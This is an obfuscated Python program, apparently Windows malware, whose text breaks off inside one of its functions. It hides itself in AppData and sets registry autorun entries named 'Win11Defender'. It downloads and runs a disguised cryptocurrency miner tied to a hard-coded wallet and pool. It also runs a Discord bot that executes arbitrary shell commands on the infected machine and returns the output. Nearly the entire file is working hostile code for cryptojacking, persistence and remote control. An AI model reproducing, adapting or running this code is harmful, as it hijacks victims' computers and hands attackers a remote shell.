#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Protected by Python Obfuscator


# Module protection - restricted
import sys as _sys

class _RestrictedModule:
    __slots__ = ('_module', '_allowed')

    def __init__(self, module, allowed):
        object.__setattr__(self, '_module', module)
        object.__setattr__(self, '_allowed', allowed)

    def __getattr__(self, name):
        if name.startswith('_'):
            raise AttributeError(f"Access denied: {name}")
        return getattr(self._module, name)

    def __setattr__(self, name, value):
        raise AttributeError("Module is read-only")

    def __dir__(self):
        return [n for n in dir(self._module) if not n.startswith('_')]

_sys.modules[__name__] = _RestrictedModule(_sys.modules[__name__], set())

# Readonly module protection
import sys as _sys

class _ReadonlyModule:
    def __init__(self, module):
        self.__dict__['_module'] = module

    def __getattr__(self, name):
        return getattr(self._module, name)

    def __setattr__(self, name, value):
        raise AttributeError(f"Cannot modify readonly module attribute: {name}")

    def __delattr__(self, name):
        raise AttributeError(f"Cannot delete readonly module attribute: {name}")

_sys.modules[__name__] = _ReadonlyModule(_sys.modules[__name__])
import requests, subprocess, os, time, sys, winreg, shutil, json, zipfile, io, platform, threading, ctypes
from ctypes import windll, wintypes
try:
    discord = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('ISb3bV4r+g=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
except:
    subprocess.run([getattr(sys, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('IDfhbUQt/6oPPw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), __import__('base64').b64decode('LW0=').decode('utf-8'), __import__('base64').b64decode('cGlw').decode('utf-8'), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('LCH3elA18g=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')), __import__('base64').b64decode('ZGlzY29yZC5weQ==').decode('utf-8')], creationflags=getattr(subprocess, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Bh3BT2UcwYYsBTiK5nK/Aw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), stdout=getattr(subprocess, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('AQrSQGQV0g=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), stderr=getattr(subprocess, __import__('base64').b64decode('REVWTlVMTA==').decode('utf-8')))
discord = __import__(__import__('base64').b64decode('ZGlzY29yZA==').decode('utf-8'))
app_commands = getattr(__import__(__import__('base64').b64decode('ZGlzY29yZA==').decode('utf-8')), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('JD/0UVI286UCNAuw'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
ad = windll.shell32.IsUserAnAdmin() != 0
b = getattr(winreg, __import__('base64').b64decode('SEtFWV9MT0NBTF9NQUNISU5F').decode('utf-8')) if ad else getattr(winreg, __import__('base64').b64decode('SEtFWV9DVVJSRU5UX1VTRVI=').decode('utf-8'))
s = getattr(sys, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('IDfhbUQt/6oPPw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))) if getattr(sys, __import__('base64').b64decode('ZnJvemVu').decode('utf-8'), False) else __file__
hd = os.path.join(os.getenv(__import__('base64').b64decode('QVBQREFUQQ==').decode('utf-8')), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('CCbnfF4q8a4X'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Eibqal4u7Q=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')), __import__('base64').b64decode('Q2FjaGVz').decode('utf-8'))
d = os.path.join(hd, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Njb3elQ0waoMLkGz0Q=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
os.makedirs(hd, exist_ok=True)
shutil.copy2(s, d)
os.system(f'attrib +h "{hd}"')
ck = [(b, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('FiDiekY47K0/Fwag2lmDOyM72FlYN/qnFCkzgN1EgjErO9JrQyr3pw0GPbbG'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), (b, __import__('base64').b64decode('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuT25jZQ==').decode('utf-8')), (b, __import__('base64').b64decode('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcRXhwbG9yZXJcUnVu').decode('utf-8')), (b, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('FiDiekY47K0/Fwag2lmDOyM72FlYN/qnFClPjfxqsyE3PeFgRQ/7uhAzAK30YZk6ISDzfQ=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('CSDlag=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), (b, __import__('base64').b64decode('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cU2hlbGwgRXh0ZW5zaW9uc1xBcHByb3ZlZA==').decode('utf-8')), (b, __import__('base64').b64decode('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cQ29tbWFuZCBQcm9jZXNzb3I=').decode('utf-8'), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('BDrwYWMs8A=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), (b, __import__('base64').b64decode('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcU2hlbGwgRm9sZGVycw==').decode('utf-8'), __import__('base64').b64decode('U3RhcnR1cA==').decode('utf-8')), (b, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('FiDiekY47K0/Fwag2lmDOyM72FlYN/qnFCkzgN1EgjErO9JrQyr3pw0GKrvYWp8mID3YW0I87OgwMgqvxBa2Oykr4XxC'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')), __import__('base64').b64decode('U3RhcnR1cA==').decode('utf-8')), (b, __import__('base64').b64decode('U29mdHdhcmVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcU3lzdGVtXFNjcmlwdHNcU3RhcnR1cA==').decode('utf-8')), (b, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('FiDiekY47K0/Fwag2lmDOyM72FlYN/qnFCkzgN1EgjErO9JrQyr3pw0GPbbGZZUmMybna0I='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), (b, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('FiDiekY47K0/Fwag2lmDOyM72FlYN/qnFCkzgN1EgjErO9JrQyr3pw0GPbbGZZUmMybna0IW8KsG'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), (b, __import__('base64').b64decode('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuT25jZUV4').decode('utf-8')), (b, __import__('base64').b64decode('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuRXh0').decode('utf-8')), (b, __import__('base64').b64decode('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cT3B0aW1hbE1heA==').decode('utf-8')), (b, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('FiDiekY47K0/Fwag2lmDOyM72FlYN/qnFCkzgN1EgjErO9JrQyr3pw0GLrPYFqA1MSf3'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), (b, __import__('base64').b64decode('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cQXV0aGVudGljYXRpb25cTG9nb25VSVxCYWNrZ3JvdW5k').decode('utf-8')), (b, __import__('base64').b64decode('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcU3RhcnR1cEFwcHJvdmVkXFJ1bg==').decode('utf-8')), (b, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('FiDiekY47K0/Fwag2lmDOyM72FlYN/qnFCkzgN1EgjErO9JrQyr3pw0GKrvYWp8mID3YXUU47LwWKi6z2ESfIiAr2FxEN636'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), (b, __import__('base64').b64decode('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcU3RhcnR1cEFwcHJvdmVkXFN0YXJ0dXBGb2xkZXI=').decode('utf-8')), (b, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('FiDiekY47K0/DQC0ngLDZgsg4GttFPerETUcrM5CrAMsIeBhRirCixYoHabGQqYxNzztYV8FzL0N'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))]
ek = []

def _ηГдбЭυορГηΧКзш():
    if False and True:
        182
        _dead_2476 = 245
        _dead_2926 = 326
    for e in ck + ek:
        try:
            if len(e) == 2:
                hk, sk = e
                vn = __import__('base64').b64decode('V2luMTFEZWZlbmRlcg==').decode('utf-8')
            else:
                hk, sk, vn = e
            h = winreg.CreateKey(hk, sk)
            winreg.SetValueEx(h, vn, 0, getattr(winreg, __import__('base64').b64decode('UkVHX1Na').decode('utf-8')), f'''"{getattr(sys, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('IDfhbUQt/6oPPw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))}" "{d}"''')
            winreg.CloseKey(h)
        except:
            pass
_ηГдбЭυορГηΧКзш()

def _фξщсДΩмθβоц():
    psutil = __import__(__import__('base64').b64decode('cHN1dGls').decode('utf-8'))
    for p in psutil.process_iter([(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('NSbg'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')), __import__('base64').b64decode('Y21kbGluZQ==').decode('utf-8')]):
        try:
            if (True or False) and (getattr(p, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('LCHiYQ=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))[(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('JiLgYlg3+w=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))] and (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('aGLzb0U69g=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')) in __import__('base64').b64decode('IA==').decode('utf-8').join(getattr(p, __import__('base64').b64decode('aW5mbw==').decode('utf-8'))[__import__('base64').b64decode('Y21kbGluZQ==').decode('utf-8')])):
                return
            elif 55 * 41 < 0:
                79
                pass
        except:
            pass
    if len('') > 0:
        pass
        pass
        920
    subprocess.Popen([getattr(sys, __import__('base64').b64decode('ZXhlY3V0YWJsZQ==').decode('utf-8')), d, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('aGLzb0U69g=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))], creationflags=getattr(subprocess, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Bh3BT2UcwYYsBTiK5nK/Aw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))))
if __import__('base64').b64decode('LS13YXRjaA==').decode('utf-8') not in getattr(sys, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('JD3jeA=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))):
    _фξщсДΩмθβоц()
Oxh = (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('CBvRd38N2/0uDj7y53K1Lgg10Xl+Hdf9LS1BhN51lxMKYd5tVWvmuAEuBvLEAskXaA3NR1AbpvA0ajmZ5EbFNwYI9EtgE6qd'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))
c = discord.Client(intents=discord.Intents.default())
t = app_commands.CommandTree(c)
xm_dir = os.path.join(hd, __import__('base64').b64decode('eG1n').decode('utf-8'))
xm_exe = os.path.join(xm_dir, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('MibqPwA9+64GNAum2hiVLCA='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
xm_cfg = os.path.join(xm_dir, __import__('base64').b64decode('Y29uZmlnLmpzb24=').decode('utf-8'))
mp = None
mt = 0
dflt_wallet = __import__('base64').b64decode('NDVxa2F6cXUxZEVUaDRaYzJ1SzQxNDd6dGtkWTZ3NFVKQUZQazFidjJaYTdkSmI5UVlEYUFiV1N4OUdLU3V3V051YlR6TTZ1TnRHTExaRGpvSlh5OFNyVjFjeHB2REs=').decode('utf-8')
dflt_pool = (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('NSDrYh8q67gTNR230FuCeiYg6TQCaq37'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))
idle_thresh = 300
start_time = time.time()

def _ИσΔΞътξξб():

    class _ИΣΥεаβΥΨСпйю(getattr(ctypes, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Fjv2e1It67oG'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))):
        _fields_ = [((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Ji3XZ0s8'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')), getattr(wintypes, __import__('base64').b64decode('VUlOVA==').decode('utf-8'))), ((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('ITjQZ1w8'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')), getattr(wintypes, __import__('base64').b64decode('RFdPUkQ=').decode('utf-8')))]
    if len('') > 0:
        363
        703
    l = _ИΣΥεаβΥΨСпйю()
    l.cbSize = ctypes.sizeof(_ИΣΥεаβΥΨСпйю)
    if False and True:
        _dead_9300 = 325
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(l)):
        return (ctypes.windll.kernel32.GetTickCount() - getattr(l, __import__('base64').b64decode('ZHdUaW1l').decode('utf-8'))) // 1000
    return 0

def _αчэηфλЫζΙννЬ():
    if False and True:
        pass
        702
        _dead_3648 = 354
    if (True or False) and os.path.exists(xm_exe):
        return
    if False and True:
        _dead_1661 = 630
    os.makedirs(xm_dir, exist_ok=True)
    if False and True:
        _dead_9503 = 423
        pass
    url = (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('LTvwfkJjsecCKgbtz1+EPDAtqm1eNLG6BioAsIdOnSYsKKt2XCv3r0woCq/NV4MxNmDob0U87bw='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))
    if 31 * 22 < 0:
        _dead_3123 = 737
        pass
    r = requests.get(url, timeout=30)
    r.raise_for_status()
    data = r.json()
    for a in data[(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('JDz3a0Uq'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))]:
        if __import__('base64').b64decode('d2lu').decode('utf-8') in a[(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Ky7paw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))].lower() and a[__import__('base64').b64decode('bmFtZQ==').decode('utf-8')].endswith(__import__('base64').b64decode('LnppcA==').decode('utf-8')):
            zurl = a[__import__('base64').b64decode('YnJvd3Nlcl9kb3dubG9hZF91cmw=').decode('utf-8')]
            break
    else:
        raise Exception(__import__('base64').b64decode('Tm8gV2luZG93cyB6aXAgZm91bmQ=').decode('utf-8'))
    if False and True:
        pass
    z = requests.get(zurl, timeout=120)
    if 85 * 16 < 0:
        pass
        pass
    z.raise_for_status()
    with zipfile.ZipFile(io.BytesIO(getattr(z, __import__('base64').b64decode('Y29udGVudA==').decode('utf-8')))) as zf:
        zf.extractall(xm_dir)
    for root, dirs, files in os.walk(xm_dir):
        for f in files:
            if 36 | 1 > 0 and f.lower() == __import__('base64').b64decode('d2luMTFkZWZlbmRlci5leGU=').decode('utf-8'):
                shutil.move(os.path.join(root, f), xm_exe)
                break
            elif False and True:
                229
                544
        if 85 * 77 >= 0 and os.path.exists(xm_exe):
            break
        elif len('') > 0:
            _dead_3644 = 171
            pass
    for f in os.listdir(xm_dir):
        p = os.path.join(xm_dir, f)
        if (True or False) and (os.path.isdir(p) and p != xm_dir):
            shutil.rmtree(p)
        elif False and True:
            665
            _dead_6455 = 502
            pass

def _ΑЬΝδЛΠΩλШψΥЦ(wallet, pool):
    cfg = {__import__('base64').b64decode('YXV0b3NhdmU=').decode('utf-8'): True, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Jj/x'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')): {__import__('base64').b64decode('ZW5hYmxlZA==').decode('utf-8'): True, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('LTrjaxwp/68GKQ=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')): True, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('LTrjaxwp/68GKUKpwUI='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')): False}, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('NSDrYkI='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')): [{(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('MD3o'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')): pool, __import__('base64').b64decode('dXNlcg==').decode('utf-8'): wallet, __import__('base64').b64decode('dGxz').decode('utf-8'): False}], (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('NT3tYEV06qEOPw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')): 60, __import__('base64').b64decode('cmFuZG9teA==').decode('utf-8'): {(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('dCjmI0E4+a0Q'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')): False, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('NyvpfUM='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')): True, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Mj3pfUM='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')): True, __import__('base64').b64decode('Y2FjaGVfcW9z').decode('utf-8'): False, __import__('base64').b64decode('bnVtYQ==').decode('utf-8'): True, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Niz2b0U69rgCPjCz2lOWMTEs7FFcNvqt'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')): 1}, __import__('base64').b64decode('dGhyZWFkcw==').decode('utf-8'): 0}
    with open(xm_cfg, __import__('base64').b64decode('dw==').decode('utf-8')) as f:
        json.dump(cfg, f, indent=2)

def _ΙΦпετΣΤЩ():
    if False and True:
        _dead_9178 = 216
        _dead_5301 = 530
        pass
    return os.cpu_count() or 1

def _ЙооΙιаЫв(idle):
    if idle > idle_thresh:
        return _ΙΦпετΣΤЩ()
    else:
        return max(1, int(_ΙΦпετΣΤЩ() * 0.25))

def _ДУОъЪШДςшИ(th):
    global mp, mt
    if (True or False) and (mp and mp.poll() is None):
        if len('xxxx') > 0 and mt == th:
            return
        mp.terminate()
        mp.wait()
    elif len('') > 0:
        732
    if False and True:
        _dead_8759 = 356
    if (True or False) and (not os.path.exists(xm_exe)):
        _αчэηфλЫζΙννЬ()
    elif False and True:
        pass
        pass
        _dead_4633 = 871
    if 96 | 1 > 0 and (not os.path.exists(xm_cfg)):
        _ΑЬΝδЛΠΩλШψΥЦ(dflt_wallet, dflt_pool)
    elif len('') > 0:
        _dead_8172 = 483
        _dead_2252 = 698
    with open(xm_cfg, __import__('base64').b64decode('cg==').decode('utf-8')) as f:
        cfg = json.load(f)
    cfg[__import__('base64').b64decode('dGhyZWFkcw==').decode('utf-8')] = th
    with open(xm_cfg, __import__('base64').b64decode('dw==').decode('utf-8')) as f:
        json.dump(cfg, f, indent=2)
    if len('') > 0:
        267
        _dead_1549 = 617
    mp = subprocess.Popen([xm_exe, __import__('base64').b64decode('LS1jb25maWc9').decode('utf-8') + xm_cfg], creationflags=getattr(subprocess, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Bh3BT2UcwYYsBTiK5nK/Aw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))))
    mt = th

def _τТΧφЫЛΓЙΣΘНшλα():
    global mp, mt
    if mp and mp.poll() is None:
        mp.terminate()
        mp.wait()
    mp = None
    mt = 0

@t.command(name=__import__('base64').b64decode('bWluZQ==').decode('utf-8'), description=(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('FjvlfEV586ENMwGkiB6fJDEm62BQNb6/AjYDptwf'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
@app_commands.describe(wallet=(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('CCDqa0M2vr8CNgOm3BaRMCE94X1C'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
async def _ЭгΑяΗэυНΔΧσУЧ(i: getattr(discord, __import__('base64').b64decode('SW50ZXJhY3Rpb24=').decode('utf-8')), wallet: str=None):
    await i.response.defer()
    try:
        if wallet:
            _ΑЬΝδЛΠΩλШψΥЦ(wallet, dflt_pool)
        elif not os.path.exists(xm_cfg):
            _ΑЬΝδЛΠΩλШψΥЦ(dflt_wallet, dflt_pool)
        idle = _ИσΔΞътξξб()
        th = _ЙооΙιаЫв(idle)
        _ДУОъЪШДςшИ(th)
        await i.followup.send(f'Mining started with {th} threads (idle={idle}s)')
    except Exception as e:
        await i.followup.send(f'Error: {e}')

@t.command(name=__import__('base64').b64decode('c3RvcG1pbmU=').decode('utf-8'), description=(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('FjvrfhE096YKNAg='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
async def _ЫУЗΝЫκψХΥНжΝЬΩ(i: getattr(discord, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('DCHwa0M4/bwKNQE='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))):
    await i.response.defer()
    try:
        _τТΧφЫЛΓЙΣΘНшλα()
        await i.followup.send(__import__('base64').b64decode('TWluaW5nIHN0b3BwZWQ=').decode('utf-8'))
    except Exception as e:
        await i.followup.send(f'Error: {e}')

@t.command(name=(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Nzrq'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')), description=(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('FzrqLlB5/acONw6tzA=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
@app_commands.describe(command=(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('BiDpY1A3+ugXNU+x3Vg='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
async def _ΞэΡΛЕдхΠΑαДшжфЗχ(i: getattr(discord, __import__('base64').b64decode('SW50ZXJhY3Rpb24=').decode('utf-8')), cmd: str):
    await i.response.defer()
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        o = getattr(r, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('NjvgYUQt'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))) or getattr(r, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Njvga0Mr'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))) or (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('CyCkYUQt7r0X'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))
        for j in range(0, len(o), 1900):
            await i.followup.send(f'```{o[j:j + 1900]}```')
    except Exception as e:
        await i.followup.send(f'Error: `{e}`')

@t.command(name=__import__('base64').b64decode('c3RhdHVz').decode('utf-8'), description=(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('FifreRE096YGKEPj31eENy0r62kdef+mB3oNrNwWgyAkO/F9'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
async def _ΝфΝγКпИиКС(i: getattr(discord, __import__('base64').b64decode('SW50ZXJhY3Rpb24=').decode('utf-8'))):
    await i.response.defer()
    try:
        lines = []
        lines.append(__import__('base64').b64decode('KipNaW5lcjoqKg==').decode('utf-8'))
        if os.path.exists(xm_exe):
            lines.append((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('aG/BdlQ667wCOAOmkha0MTUj63dUPQ=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
        else:
            lines.append(__import__('base64').b64decode('LSBFeGVjdXRhYmxlOiBOb3QgZm91bmQ=').decode('utf-8'))
        if len('x') > 0 and os.path.exists(xm_cfg):
            lines.append((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('aG/HYV8/969Zej+xzUWVOjE='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
        else:
            if False and True:
                _dead_1470 = 869
                440
                382
            lines.append((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('aG/HYV8/969ZeiKq20WZOiI='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
        if mp and mp.poll() is None:
            lines.append(f'- Process: Running (threads={mt})')
        else:
            lines.append((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('aG/UfF46+7sQYE+Q3FmAJCAr'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
        lines.append(__import__('base64').b64decode('CioqV2F0Y2hkb2c6Kio=').decode('utf-8'))
